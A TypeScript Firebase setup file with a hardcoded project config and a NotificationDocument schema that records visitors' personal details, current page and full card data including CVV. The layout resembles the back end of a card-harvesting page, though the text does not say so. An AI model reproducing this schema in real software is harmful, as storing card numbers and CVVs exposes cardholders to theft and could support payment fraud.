import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyC0QiZE1GmEDvLy2eS1NX3WfzNlRhPH5iY",
  authDomain: "asdfgbn-b1dbc.firebaseapp.com",
  databaseURL: "https://asdfgbn-b1dbc-default-rtdb.firebaseio.com",
  projectId: "asdfgbn-b1dbc",
  storageBucket: "asdfgbn-b1dbc.firebasestorage.app",
  messagingSenderId: "825392169955",
  appId: "1:825392169955:web:a462b3bbed650a7157d6d6",
  measurementId: "G-KW3K2EDW97"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
